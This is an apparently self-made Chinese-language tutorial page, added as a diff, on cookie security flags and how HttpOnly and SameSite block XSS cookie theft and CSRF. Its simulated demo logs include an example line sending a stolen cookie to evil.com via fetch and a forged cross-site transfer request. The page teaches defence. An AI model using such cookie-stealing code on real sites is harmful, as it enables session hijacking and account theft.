@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie 完整教學</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar"><a href="index.html">← 回索引</a><span class="tag">資安-02 · ⭐ 必考</span></div>
+
+  <header class="hero">
+    <div class="kicker">資安專題 · 認證</div>
+    <h1>Cookie 的<em>每個旗標</em><br>都在擋一種攻擊</h1>
+    <p class="lede">Cookie 是 server 放在瀏覽器、之後每次請求都<b>自動帶回</b>的一小段資料，最常用來記住「你是誰」（session / token）。但「自動帶回」這個特性正是資安風險的來源 —— 所以每個設定旗標，其實都在補一個洞。</p>
+  </header>
+
+  <section>
+    <span class="num">先搞懂</span>
+    <h2>Cookie 是什麼？怎麼運作？</h2>
+    <p>登入成功後，server 回一個 <code>Set-Cookie</code> header；瀏覽器存起來，之後對<b>同一個網域</b>的每次請求都自動在 <code>Cookie</code> header 帶上它。server 看到就知道「喔，是剛剛登入的 Emily」。</p>
+    <pre><code><span class="tok-com">// server 回應：</span>
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
+
+<span class="tok-com">// 之後瀏覽器每次請求自動帶：</span>
+Cookie: sessionId=abc123</code></pre>
+    <div class="callout info"><span class="ico">💡</span><p>關鍵理解：cookie 的「<b>自動帶回</b>」很方便，但也代表<b>惡意網站可能借用你的 cookie</b>（CSRF），或 <b>惡意 JS 可能偷讀你的 cookie</b>（XSS）。下面每個旗標就是在堵這些。</p></div>
+  </section>
+
+  <section>
+    <span class="num">先認識兩個攻擊</span>
+    <h2>XSS 與 CSRF 是什麼？</h2>
+    <p>cookie 的安全設定主要在防這兩種攻擊，先用白話搞懂它們，後面才看得懂旗標在擋什麼。</p>
+
+    <h3>🦠 XSS（Cross-Site Scripting，跨站腳本）</h3>
+    <p>攻擊者想辦法把<b>惡意 JavaScript 塞進你的網頁</b>，讓它在<b>別人的瀏覽器裡執行</b>。</p>
+    <p>最典型的例子：留言板沒有過濾輸入，攻擊者把暱稱填成 <code>&lt;script&gt;偷cookie送走&lt;/script&gt;</code>。之後<b>任何人打開這個頁面</b>，那段 script 就在他們瀏覽器裡跑起來，偷走他們的 cookie / token。</p>
+    <div class="callout warn"><span class="ico">🎯</span><p>一句話：<b>「壞人的 JS 在你網站上跑」</b>。所以重點是「別讓使用者輸入變成可執行的程式碼」+「就算被執行了，也讓它偷不到 cookie」（這就是 <code>HttpOnly</code> 的用途）。</p></div>
+
+    <h3>🎣 CSRF（Cross-Site Request Forgery，跨站請求偽造）</h3>
+    <p>攻擊者<b>不偷你的 cookie</b>，而是<b>借用</b>它。因為 cookie 會自動帶回，攻擊者只要<b>騙你在登入狀態下，去觸發一個對目標網站的請求</b>即可。</p>
+    <p>典型例子：你登入了銀行（cookie 還在），這時收到一封信，點了裡面的圖片或連結，那其實是 <code>evil.com</code> 偷偷對 <code>bank.com/transfer</code> 送出的轉帳請求。瀏覽器一看是打 bank.com，<b>自動把你的銀行 cookie 帶上去</b>，銀行就以為是你本人操作。</p>
+    <div class="callout warn"><span class="ico">🎯</span><p>一句話：<b>「壞人借你還沒登出的身份，替你發請求」</b>。所以重點是「跨站來的請求別自動帶 cookie」（這就是 <code>SameSite</code> 的用途）。</p></div>
+
+    <div class="callout info"><span class="ico">⚖️</span><p>一句話分清楚：<b>XSS 是偷 cookie（讀）</b>，<b>CSRF 是借用 cookie（送）</b>。前者靠 HttpOnly 防、後者靠 SameSite 防。</p></div>
+  </section>
+
+  <section>
+    <span class="num">DEMO 1 — 安全設定產生器</span>
+    <h2>勾選旗標，即時看安全分數</h2>
+    <p>勾選下面的設定，看 <code>Set-Cookie</code> 怎麼長、安全分數怎麼變：</p>
+    <div class="lab">
+      <div class="lab-label">勾選旗標</div>
+      <div id="flags" style="display:flex;flex-direction:column;gap:.6rem;margin-bottom:1.2rem"></div>
+      <div style="font-family:var(--mono);font-size:.75rem;color:var(--ink-soft);margin-bottom:.4rem">產生的 Set-Cookie：</div>
+      <pre><code id="cookieOut"></code></pre>
+      <div style="display:flex;align-items:center;gap:1rem;margin-top:1rem;flex-wrap:wrap">
+        <div style="flex:1;min-width:140px">
+          <div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:.78rem;color:var(--ink-soft)"><span>安全分數</span><span id="scoreNum">0 / 100</span></div>
+          <div style="height:20px;border-radius:8px;background:var(--paper);border:1px solid var(--line);overflow:hidden;margin-top:.3rem"><div id="scoreBar" style="height:100%;width:0%;background:var(--bad);transition:width .3s,background .3s"></div></div>
+        </div>
+      </div>
+      <div id="advice" style="margin-top:1rem;font-weight:700;min-height:1.5em;color:var(--ink-soft)"></div>
+    </div>
+  </section>
+
+  <section>
+    <span class="num">逐一拆解</span>
+    <h2>每個旗標擋什麼</h2>
+
+    <h3>🔒 HttpOnly — 擋 XSS 偷 cookie</h3>
+    <p>加了 <code>HttpOnly</code>，<b>JavaScript 就讀不到這個 cookie</b>（<code>document.cookie</code> 看不見它）。所以就算網站中了 XSS、攻擊者的 JS 在你瀏覽器裡跑，也偷不走你的 session。<b>放 token / sessionId 的 cookie 一定要加。</b></p>
+
+    <h3>🔐 Secure — 只走 HTTPS</h3>
+    <p>加了 <code>Secure</code>，cookie <b>只會在 HTTPS 連線時送出</b>，不會在 http 明文裡裸奔被中間人攔截。正式環境必加。</p>
+
+    <h3>🛡️ SameSite — 擋 CSRF</h3>
+    <p>控制「<b>跨站</b>請求要不要自動帶這個 cookie」。這是 CSRF 防禦的核心：</p>
+    <table>
+      <tr><th>值</th><th>跨站時帶 cookie？</th><th>說明</th></tr>
+      <tr><td><code>Strict</code></td><td>完全不帶</td><td>最安全，但從外部連結點進來也不帶 → 會「看起來像沒登入」</td></tr>
+      <tr><td><code>Lax</code><br><small style="color:var(--good)">預設</small></td><td>只有「頂層導航 GET」帶</td><td>平衡點：點連結進站 OK，但跨站 POST/表單不帶</td></tr>
+      <tr><td><code>None</code></td><td>都帶</td><td>必須同時加 <code>Secure</code>，否則瀏覽器拒收。用於真的需要跨站的場景</td></tr>
+    </table>
+
+    <h3>🌐 Domain / Path — 限制範圍</h3>
+    <p><code>Domain</code> 決定哪些子網域收得到、<code>Path</code> 決定哪些路徑收得到。範圍開越小越安全（最小權限原則）。</p>
+
+    <h3>⏰ Expires / Max-Age — 存活時間</h3>
+    <p>不設 → <b>session cookie</b>（關瀏覽器就消失）；有設 → <b>持久 cookie</b>（到期前都在）。敏感 cookie 設短一點。</p>
+
+    <h3>✨ __Host- / __Secure- 前綴</h3>
+    <p>cookie 名稱用 <code>__Host-</code> 開頭，瀏覽器會<b>強制</b>它必須有 Secure、Path=/、且不能設 Domain —— 等於把安全設定鎖死，防止被攻擊者用較寬鬆的設定覆蓋。</p>
+  </section>
+
+  <section>
+    <span class="num">DEMO 2 — HttpOnly 防 XSS 實測</span>
+    <h2>攻擊者的 JS 想偷 cookie</h2>
+    <p>假設網站中了 XSS，攻擊者注入 <code>document.cookie</code> 想偷走 token。切換 HttpOnly 看結果：</p>
+    <div class="lab">
+      <div class="lab-label">切換 HttpOnly</div>
+      <div class="toggle-row" id="hoRow">
+        <button data-h="off" class="on bad">沒加 HttpOnly</button>
+        <button data-h="on">加了 HttpOnly</button>
+      </div>
+      <button class="btn-primary" id="stealBtn" style="margin-bottom:1rem">😈 執行 document.cookie 偷取</button>
+      <div class="log" id="hoLog"><div class="ln empty">// 攻擊結果顯示在這…</div></div>
+    </div>
+  </section>
+
+  <section>
+    <span class="num">DEMO 3 — SameSite 擋 CSRF</h2>
+    <h2>惡意網站想借用你的 cookie 轉帳</h2>
+    <p>你登入了銀行（cookie 還在）。惡意網站偷偷對銀行送一個轉帳請求，瀏覽器會不會自動帶上你的 cookie？切換 SameSite 看：</p>
+    <div class="lab">
+      <div class="lab-label">切換 SameSite</div>
+      <div class="toggle-row" id="ssRow">
+        <button data-s="none" class="on bad">None</button>
+        <button data-s="lax">Lax</button>
+        <button data-s="strict">Strict</button>
+      </div>
+      <button class="btn-primary" id="csrfBtn" style="margin-bottom:1rem">😈 從 evil.com 對 bank.com 送轉帳</button>
+      <div class="log" id="ssLog"><div class="ln empty">// CSRF 攻擊結果顯示在這…</div></div>
+    </div>
+  </section>
+
+  <section>
+    <span class="num">常見踩雷</span>
+    <h2>這些最容易出事</h2>
+    <div class="callout warn"><span class="ico">✕</span><p>把 token 放在<b>沒有 HttpOnly</b> 的 cookie 或 localStorage → 中 XSS 就被偷光。</p></div>
+    <div class="callout warn"><span class="ico">✕</span><p><code>SameSite=None</code> 卻<b>沒加 Secure</b> → 瀏覽器直接拒收這個 cookie。</p></div>
+    <div class="callout warn"><span class="ico">✕</span><p>跨來源請求要帶 cookie，卻忘了 server 設 <code>Access-Control-Allow-Credentials: true</code> 且 <code>Allow-Origin</code> 不能是 <code>*</code>（見 <a href="網路-05-CORS跨來源資源共用.html">CORS</a>）。</p></div>
+    <div class="callout warn"><span class="ico">✕</span><p>本機開發用 http 測，cookie 加了 Secure 卻一直收不到 —— 因為 Secure 只走 HTTPS。</p></div>
+  </section>
+
+  <section class="interview">
+    <span class="num">面試這樣答</span>
+    <h2>30 秒版本</h2>
+    <p class="quote">「存 token 的 cookie 我一定加三件套：<span class="hl">HttpOnly</span> 讓 JS 讀不到、擋 XSS 偷 cookie；<span class="hl">Secure</span> 只走 HTTPS、防中間人；<span class="hl">SameSite=Lax</span>（或 Strict）擋 CSRF 的跨站自動帶 cookie。範圍用 Domain/Path 收到最小、敏感 cookie 設短 TTL，講究一點用 <span class="hl">__Host-</span> 前綴把安全設定鎖死。如果是行動端或跨站場景，才會用 SameSite=None + Secure 並另外加 CSRF token。」</p>
+  </section>
+
+  <footer>
+    <div>相關筆記</div>
+    <div class="rel">
+      <a href="資安-01-常見Web威脅與防禦.html">資安-01 Web威脅</a>
+      <a href="API-06-JWT與Session認證.html">API-06 JWT/Session</a>
+      <a href="網路-05-CORS跨來源資源共用.html">網路-05 CORS</a>
+      <a href="網路-04-TLS與HTTPS握手.html">網路-04 TLS</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  /* ===== DEMO 1: 安全設定產生器 ===== */
+  (function(){
+    const flagDefs=[
+      {key:'HttpOnly', score:30, label:'HttpOnly', desc:'JS 讀不到 → 擋 XSS 偷 cookie', on:false},
+      {key:'Secure',   score:25, label:'Secure', desc:'只走 HTTPS → 防中間人攔截', on:false},
+      {key:'SameSite', score:30, label:'SameSite=Lax', desc:'跨站不自動帶 → 擋 CSRF', on:false},
+      {key:'Host',     score:15, label:'__Host- 前綴', desc:'把安全設定鎖死防覆蓋', on:false},
+    ];
+    const wrap=document.getElementById('flags');
+    const out=document.getElementById('cookieOut');
+    const bar=document.getElementById('scoreBar');
+    const num=document.getElementById('scoreNum');
+    const advice=document.getElementById('advice');
+    function render(){
+      wrap.innerHTML='';
+      flagDefs.forEach((f,i)=>{
+        const row=document.createElement('button');
+        row.style.cssText=`text-align:left;display:flex;gap:.7rem;align-items:center;padding:.7rem .9rem;border-radius:9px;border:1.5px solid ${f.on?'var(--good)':'var(--line)'};background:${f.on?'var(--good-soft)':'var(--paper)'};color:var(--ink)`;
+        row.innerHTML=`<span style="width:20px;height:20px;border-radius:5px;border:2px solid ${f.on?'var(--good)':'var(--line)'};background:${f.on?'var(--good)':'transparent'};color:#fff;display:grid;place-items:center;font-size:.8rem;flex-shrink:0">${f.on?'✓':''}</span><span><b>${f.label}</b><span style="font-weight:400;color:var(--ink-soft);font-size:.85rem"> — ${f.desc}</span></span>`;
+        row.addEventListener('click',()=>{ f.on=!f.on; update(); });
+        wrap.appendChild(row);
+      });
+    }
+    function update(){
+      render();
+      const name = flagDefs[3].on ? '__Host-sessionId' : 'sessionId';
+      let parts=[name+'=abc123'];
+      if(flagDefs[0].on) parts.push('HttpOnly');
+      if(flagDefs[1].on || flagDefs[3].on) parts.push('Secure');
+      if(flagDefs[2].on) parts.push('SameSite=Lax');
+      if(flagDefs[3].on) parts.push('Path=/');
+      out.textContent='Set-Cookie: '+parts.join('; ');
+      let score=flagDefs.reduce((s,f)=>s+(f.on?f.score:0),0);
+      // __Host- 需要 Secure 才合法
+      num.textContent=score+' / 100';
+      bar.style.width=score+'%';
+      bar.style.background = score>=80?'var(--good)' : score>=50?'oklch(72% .15 70)' : 'var(--bad)';
+      if(score>=85) advice.innerHTML='<span style="color:var(--good)">✅ 很安全！這就是存 session/token 該有的設定。</span>';
+      else if(flagDefs[3].on && !flagDefs[1].on) advice.innerHTML='<span style="color:var(--bad)">⚠️ __Host- 前綴強制要 Secure，記得勾上。</span>';
+      else if(!flagDefs[0].on) advice.innerHTML='<span style="color:var(--bad)">⚠️ 沒加 HttpOnly，中了 XSS 就會被偷 token。</span>';
+      else advice.innerHTML='<span style="color:var(--ink-soft)">還能更安全，試著補齊其他旗標。</span>';
+    }
+    update();
+  })();
+
+  /* ===== DEMO 2: HttpOnly 防 XSS ===== */
+  (function(){
+    let ho='off';
+    const $=id=>document.getElementById(id);
+    const log=$('hoLog'),hoRow=$('hoRow');
+    function addLog(html,cls){ const em=log.querySelector('.empty'); if(em)em.remove(); const d=document.createElement('div'); d.className='ln '+(cls||''); d.innerHTML=html; log.appendChild(d); }
+    hoRow.addEventListener('click',e=>{ const b=e.target.closest('button'); if(!b)return; [...hoRow.children].forEach(x=>x.classList.remove('on')); b.classList.add('on'); ho=b.dataset.h; log.innerHTML='<div class="ln empty">// 攻擊結果顯示在這…</div>'; });
+    $('stealBtn').addEventListener('click',()=>{
+      log.innerHTML='';
+      addLog('<span class="c-req">攻擊者注入的 JS：const t = document.cookie</span>');
+      if(ho==='off'){ addLog('<span class="c-bad">→ t = "sessionId=abc123" 😱</span>','c-bad'); addLog('<span class="c-bad">→ fetch("evil.com?steal="+t) 把 token 送走，帳號被盜</span>','c-bad'); }
+      else { addLog('<span class="c-ok">→ t = "" （document.cookie 看不到 HttpOnly cookie）</span>','c-ok'); addLog('<span class="c-ok">→ 偷不到 token，XSS 拿它沒辦法 ✓</span>','c-ok'); }
+    });
+  })();
+
+  /* ===== DEMO 3: SameSite 擋 CSRF ===== */
+  (function(){
+    let ss='none';
+    const $=id=>document.getElementById(id);
+    const log=$('ssLog'),ssRow=$('ssRow');
+    function addLog(html,cls){ const em=log.querySelector('.empty'); if(em)em.remove(); const d=document.createElement('div'); d.className='ln '+(cls||''); d.innerHTML=html; log.appendChild(d); }
+    ssRow.addEventListener('click',e=>{ const b=e.target.closest('button'); if(!b)return; [...ssRow.children].forEach(x=>x.classList.remove('on')); b.classList.add('on'); ss=b.dataset.s; log.innerHTML='<div class="ln empty">// CSRF 攻擊結果顯示在這…</div>'; });
+    $('csrfBtn').addEventListener('click',()=>{
+      log.innerHTML='';
+      addLog('<span class="c-req">evil.com 偷偷送：POST bank.com/transfer（跨站）</span>');
+      if(ss==='none'){ addLog('<span class="c-bad">→ SameSite=None：瀏覽器自動帶上你的 bank cookie 😱</span>','c-bad'); addLog('<span class="c-bad">→ 銀行以為是你本人 → 轉帳成功，被盜！</span>','c-bad'); }
+      else if(ss==='lax'){ addLog('<span class="c-ok">→ SameSite=Lax：跨站的 POST 不帶 cookie</span>','c-ok'); addLog('<span class="c-ok">→ 銀行看不到登入身份 → 擋下 ✓</span>','c-ok'); }
+      else { addLog('<span class="c-ok">→ SameSite=Strict：任何跨站請求都不帶 cookie</span>','c-ok'); addLog('<span class="c-ok">→ 直接擋死 ✓（但從外部連結點進站也不帶）</span>','c-ok'); }
+    });
+  })();
+</script>
+</body>
+</html>
